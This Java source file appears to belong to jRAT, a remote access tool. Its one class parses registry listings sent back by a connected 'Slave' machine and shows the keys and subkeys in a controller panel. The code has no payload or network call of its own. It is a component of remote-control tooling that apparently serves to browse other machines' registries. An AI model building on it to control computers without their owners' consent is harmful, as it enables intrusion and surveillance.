package jrat.module.registry;

import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.module.registry.ui.PanelRegistry;

public class PacketResult implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String path = slave.readLine();

		PanelRegistry frame = (PanelRegistry) slave.getPanel(PanelRegistry.class);

		while (slave.readBoolean()) {
			String line = slave.readLine();

			if (line.length() == 0) {
			    continue;
            }

			String[] args = line.trim().split("    ");

			String name = args[0];
			name = name.substring(name.lastIndexOf("\\") + 1, name.length());

			System.out.println(line);
			if (args.length >= 3) {
                boolean sz = args[1].equalsIgnoreCase("REG_SZ");
                String value = args[2];

                frame.addKey(name, value, sz);
            } else {
                frame.addSubkey(path, name);
            }
		}
	}
}
